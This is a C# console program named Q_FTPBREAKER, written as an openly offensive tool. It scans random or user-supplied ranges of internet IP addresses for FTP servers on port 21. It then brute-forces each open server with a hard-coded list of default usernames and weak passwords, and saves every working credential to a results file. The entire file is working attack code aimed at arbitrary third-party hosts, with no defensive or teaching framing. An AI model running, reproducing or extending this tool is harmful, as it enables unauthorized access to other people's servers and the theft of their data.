using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Net.Http;
using System.Web;
using System.Net;

namespace Q_FTPBREAKER
{
    public class ftpp
    {
        //MADE BY ATERRAGON
        //HECHO POR ATERRAGON
        //MADE BY  secleGhost
        //HECHO POR  secleGhost

        public static List<string> final = new List<string>();

        public static void Hilo(object G)
        {
            dynamic Z = G;
            int inicio = Z.A;
            string[] ip = Z.B;
            int final = Z.C;
            int timeout = Z.D;
            for (int i = inicio; i < final; i++)
            {
                TcpClient tcp = new TcpClient();
                try
                {
                    tcp.ConnectAsync(ip[i], 21).Wait(timeout);
                    if (tcp.Connected)
                    {
                        Console.WriteLine("{0} Conected", ip[i]);
                        Thread hilo = new Thread(new ParameterizedThreadStart(HILO1));
                        string A = ip[i];
                        hilo.Start(new { A });
                    }
                    else
                    {
                        Console.WriteLine("{0}", ip[i]);
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine("{0}", ip[i]);
                }
            }
        }

        public static void HILO1(object X)
        {
            dynamic V = X;
            string ip = V.A;
            string[] usuario = { "admin", "root", "ftp", "anonymous", "guest" };//USER BRUTERFORCE
            string[] contrasenas = { "12345", "root", "admin", "password", "123456", "1234", "ftp", "123123", "pass", "qwerty", "admin123", "123321", "12344321", "toor", "qwerty123", "1q2w3e4r", "987654321", "111111", "1111", "654321", "!@#$%^", "0000", "000000", "12345678", "666666", "888888", "777777", "555555", "111222333", "123123123", "123454321", "0123456789", "guest", "backup" };//PASSWORD BRUTERFORCE
            string a = "ftp://" + ip;
            bool pass = false;

            for (int i = 0; i < usuario.Length; i++)
            {
                for (int b = 0; b < contrasenas.Length; b++)
                {
                    try
                    {
                        FtpWebRequest request = (FtpWebRequest)WebRequest.Create(a);
                        request.Timeout = 5000;//Timeout ftp
                        request.Method = WebRequestMethods.Ftp.ListDirectory;
                        request.Credentials = new NetworkCredential(usuario[i], contrasenas[b]);
                        request.GetResponse();
                        Console.WriteLine("{0}:{1}@{2}-----------------------------------------------Connected", a, usuario[i], contrasenas[b]);
                        Regreso(a + ":" + usuario[i] + "@" + contrasenas[b]);
                        pass = true;
                        break;
                    }
                    catch
                    {
                        Console.WriteLine("{0}:{1}@{2}", a, usuario[i], contrasenas[b]);
                    }
                }
                if (pass == true)
                {
                    break;
                }
            }
        }

        public static string Regreso(string ip)
        {
            final.Add(ip);
            return ip;
        }

        public static string[] L()
        {
            return final.ToArray();
        }

        public static void Main(string[] args)
        {
            int seleccion;
            int numeroips = 0;
            bool pasar = false;
            int hilos;
            string[] resultado;
            int timeout;
            Random aleatorios = new Random();

            do
            {
                Console.WriteLine("1-IP RANDOM\n2-IP RANGE");
                Console.Write("OPTION:");
                seleccion = Convert.ToInt32(Console.ReadLine());
                if (seleccion == 1 || seleccion == 2)
                {
                    pasar = true;
                }
                else
                {
                    pasar = false;
                    Console.Clear();
                }
            } while (pasar == false);
            if (seleccion == 1)
            {
                do
                {
                    try
                    {
                        Console.Clear();
                        do
                        {
                            Console.WriteLine("IP number to generate");
                            Console.Write("Number:");
                            numeroips = Convert.ToInt32(Console.ReadLine());
                            if (numeroips > 0)
                            {
                                pasar = true;
                            }
                            else
                            {
                                pasar = false;
                                Console.Clear();
                            }
                        } while (pasar == false);
                        do
                        {
                            Console.Write("Threads:");
                            hilos = Convert.ToInt32(Console.ReadLine());
                            if (hilos > 0)
                            {
                                pasar = true;
                            }
                            else
                            {
                                pasar = false;
                                Console.Clear();
                            }
                        } while (pasar == false);
                        do
                        {
                            Console.Write("Timeout seconds:");
                            timeout = Convert.ToInt32(Console.ReadLine());
                            if (timeout > 0)
                            {
                                pasar = true;
                            }
                            else
                            {
                                pasar = false;
                                Console.Clear();
                            }
                        } while (pasar == false);

                        resultado = new string[numeroips];
                        for (int i = 0; i < numeroips; i++)
                        {
                            string ip1 = Convert.ToString(aleatorios.Next(0, 256));
                            string ip2 = Convert.ToString(aleatorios.Next(0, 256));
                            string ip3 = Convert.ToString(aleatorios.Next(0, 256));
                            string ip4 = Convert.ToString(aleatorios.Next(0, 256));

                            resultado[i] = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
                        }

                        for (int i = 0; i < hilos; i++)
                        {
                            Thread hilo = new Thread(new ParameterizedThreadStart(Hilo));
                            if (i == hilos - 1)
                            {
                                int A = (resultado.Length / hilos) * i;
                                string[] B = resultado;
                                int C = resultado.Length;
                                int D = timeout * 1000;
                                hilo.Start(new { A, B, C, D });
                            }
                            else
                            {
                                int A = (resultado.Length / hilos) * i;
                                string[] B = resultado;
                                int C = (resultado.Length / hilos) * (i + 1);
                                int D = timeout * 1000;
                                hilo.Start(new { A, B, C, D });
                            }
                        }
                        pasar = true;
                    }
                    catch (Exception)
                    {
                        pasar = true;
                    }
                } while (pasar == false);
            }
            if (seleccion == 2)
            {
                do
                {
                    try
                    {
                        Console.Clear();
                        string rango;
                        do
                        {
                            Console.WriteLine("Range example:1.1.1.1-255.255.255.255");
                            Console.Write("Range:");
                            rango = Convert.ToString(Console.ReadLine());
                            if (!String.IsNullOrEmpty(rango))
                            {
                                pasar = true;
                            }
                            else
                            {
                                pasar = false;
                                Console.Clear();
                            }
                        } while (pasar == false);
                        do
                        {
                            Console.Write("Threads:");
                            hilos = Convert.ToInt32(Console.ReadLine());
                            if (hilos > 0)
                            {
                                pasar = true;
                            }
                            else
                            {
                                pasar = false;
                                Console.Clear();
                            }
                        } while (pasar == false);
                        do
                        {
                            Console.Write("Timeout seconds:");
                            timeout = Convert.ToInt32(Console.ReadLine());
                            if (timeout > 0)
                            {
                                pasar = true;
                            }
                            else
                            {
                                pasar = false;
                                Console.Clear();
                            }
                        } while (pasar == false);

                        char deli = '-';
                        char deli1 = '.';
                        string[] a = rango.Split(deli);
                        int[] ab = Array.ConvertAll(a[0].Split(deli1), int.Parse);
                        int[] ac = Array.ConvertAll(a[1].Split(deli1), int.Parse);
                        int a1 = (ac[0] - ab[0]) * 16777216;
                        int a2 = (ac[1] - ab[1]) * 65536;
                        int a3 = (ac[2] - ab[2]) * 256;
                        int a4 = ac[3] - ab[3];

                        int total = a1 + a2 + a3 + a4;

                        resultado = new string[total];
                        resultado[0] = Convert.ToString(ab[0] + "." + ab[1] + "." + ab[2] + "." + ab[3]);

                        for (int i = 1; i < total; i++)
                        {
                            if (ab[0] == ac[0] && ab[1] == ac[1] && ab[2] == ac[2] && ab[3] == ab[3])
                            {
                                break;
                            }
                            ++ab[3];
                            if (ab[3] == 256 && ab[2] != 255)
                            {
                                ++ab[2];
                                ab[3] = 0;
                            }
                            else if (ab[1] != 255 && ab[2] == 255 && ab[3] == 256)

                            {
                                ++ab[1];
                                ab[2] = 0;
                                ab[3] = 0;
                            }
                            else if (ab[1] == 255 && ab[2] == 255 && ab[3] == 256)
                            {
                                ++ab[0];
                                ab[1] = 0;
                                ab[2] = 0;
                                ab[3] = 0;
                            }

                            resultado[i] = Convert.ToString(ab[0] + "." + ab[1] + "." + ab[2] + "." + ab[3]);
                        }

                        for (int i = 0; i < hilos; i++)
                        {
                            Thread hilo = new Thread(new ParameterizedThreadStart(Hilo));
                            if (i == hilos - 1)
                            {
                                int A = (resultado.Length / hilos) * i;
                                string[] B = resultado;
                                int C = resultado.Length;
                                int D = timeout * 1000;
                                hilo.Start(new { A, B, C, D });
                            }
                            else
                            {
                                int A = (resultado.Length / hilos) * i;
                                string[] B = resultado;
                                int C = (resultado.Length / hilos) * (i + 1);
                                int D = timeout * 1000;
                                hilo.Start(new { A, B, C, D });
                            }
                        }
                        pasar = true;
                    }
                    catch (Exception)
                    {
                        pasar = false;
                    }
                } while (pasar == false);
            }
            Console.WriteLine("PRESS ENTER TWO TIMES TO FINALIZE");
            Console.Read();
            Random aleatoria = new Random();
            char v = (char)aleatoria.Next('a', 'z');
            string[] finallista = new string[numeroips];
            finallista = final.ToArray();
            string path = @".\result-" + v + ".txt";
            try
            {
                if (!String.IsNullOrEmpty(finallista[0]))
                {
                    File.WriteAllLines(path, finallista);
                }
            }
            catch (Exception)
            {
                Console.WriteLine("No results");
            }
            Environment.Exit(-1);
        }
    }
}